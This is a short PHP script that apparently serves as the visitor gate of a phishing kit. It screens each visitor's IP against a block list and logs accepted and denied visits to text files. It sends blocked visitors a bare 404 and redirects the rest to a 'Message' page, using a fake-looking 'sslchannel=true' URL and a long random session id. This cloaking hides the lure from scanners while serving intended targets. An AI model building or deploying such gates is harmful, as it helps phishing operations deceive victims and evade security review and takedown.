<?php

require_once("ai_assetz/ninc/functions.php");
$ips = array(	$_SERVER['REMOTE_ADDR'],
);
$checklist = new IpBlockList( );
foreach ($ips as $ip ) {
	$result = $checklist->ipPass( $ip );
	if ( $result ) {
		$msg = "PASSED: ".$checklist->message();
        $fp = fopen("ai_assetz/visitor_l0gz/accepted.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);		
		session_start();
        $_SESSION['page_a_visited'] = true;
		redirectTo("Message?sslchannel=true&sessionid=" . generateRandomString(130));
	}
	else {
		$msg = "FAILED: ".$checklist->message();
		$fp = fopen("ai_assetz/visitor_l0gz/denied.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
		}
}

?>
